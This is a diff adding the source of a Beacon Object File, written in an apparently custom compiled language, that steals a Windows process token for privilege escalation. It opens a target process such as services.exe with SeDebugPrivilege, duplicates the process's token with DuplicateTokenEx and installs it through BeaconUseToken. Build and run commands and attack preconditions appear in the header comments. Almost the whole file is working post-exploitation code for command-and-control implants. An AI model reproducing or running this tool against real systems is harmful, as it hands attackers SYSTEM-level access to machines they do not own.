@@ -1,0 +1,81 @@
+// SPDX-License-Identifier: Apache-2.0
+// bof_token_steal.etpy - privilege escalation via token theft.
+//
+// Same tradecraft as TrustedSec's `steal_token` BOF; ~80 lines
+// instead of ~400 because:
+//   * the language already lowers structured-binding calls to the
+//     Win64 ABI (no manual rcx/rdx juggling);
+//   * BeaconUseToken / BeaconRevertToken are typed extern fns out
+//     of `use bof;` - no header wrestling;
+//   * the inline struct decl matches the OS ABI directly.
+//
+// Build:  entc compile example/bof_token_steal.etpy --type=bof
+// Args:   --iarg <pid>    (target process; required)
+// Run:    bof-runner example/bof_token_steal.obj --iarg 1648    # services.exe
+//
+// Pre-conditions:
+//   * SeDebugPrivilege on the calling token (admin / SYSTEM).
+//   * The target's primary token must be impersonatable (which
+//     it is for any process whose owner SID we hold or which is
+//     SecurityImpersonation-class - services.exe always works).
+
+
+use bof;
+
+fn go(args: char*, len: int) -> void {
+
+    var parser: datap;
+    BeaconDataParse(&parser, args, len);
+    var pid: int = BeaconDataInt(&parser);
+    
+    if pid == 0 {
+        BeaconPrintf(0, "[!] usage: token_steal <pid>\n");
+        BeaconPrintf(0, "    pick a SYSTEM-owned PID via the `ps` BOF first.\n");
+        ret;
+    }
+
+    BeaconPrintf(0, str.format("[+] targeting pid {d}\n", pid));
+
+    // Requires SeDebugPrivilege to open a SYSTEM-owned process.
+    var h_proc: u64 = (u64)Kernel32.OpenProcess(
+        PROCESS_QUERY_INFORMATION, 0, (u32)pid);
+    if h_proc == 0 {
+        BeaconPrintf(0, "[!] OpenProcess failed (need SeDebugPrivilege)\n");
+        ret;
+    }
+
+    var h_token: u64 = 0;
+    var ok: int = Advapi32.OpenProcessToken(
+        (void*)h_proc,
+        TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE,
+        &h_token);
+    if ok == 0 {
+        Kernel32.CloseHandle((void*)h_proc);
+        BeaconPrintf(0, "[!] OpenProcessToken failed\n");
+        ret;
+    }
+
+    var h_dup: u64 = 0;
+    ok = Advapi32.DuplicateTokenEx((void*)h_token, 0, (void*)0, 2, 2, &h_dup);
+
+    // Source token + process handle no longer needed once the duplicate is in hand. Close in reverse order of opening so a leak in DuplicateTokenEx doesn't strand them.
+    Kernel32.CloseHandle((void*)h_token);
+    Kernel32.CloseHandle((void*)h_proc);
+
+    if ok == 0 || h_dup == 0 {
+        BeaconPrintf(0, "[!] DuplicateTokenEx failed\n");
+        ret;
+    }
+
+    // BeaconUseToken installs the impersonation token as the identity used for subsequent BOFs + commands. 
+    var used: bool = BeaconUseToken((void*)h_dup);
+    if used == false {
+        Kernel32.CloseHandle((void*)h_dup);
+        BeaconPrintf(0, "[!] BeaconUseToken refused the token\n");
+        ret;
+    }
+
+    BeaconPrintf(0, str.format("[+] token from pid {d} installed\n", pid));
+    BeaconPrintf(0, "[+] use `getuid` to confirm, `rev2self` to release\n");
+    ret;
+}
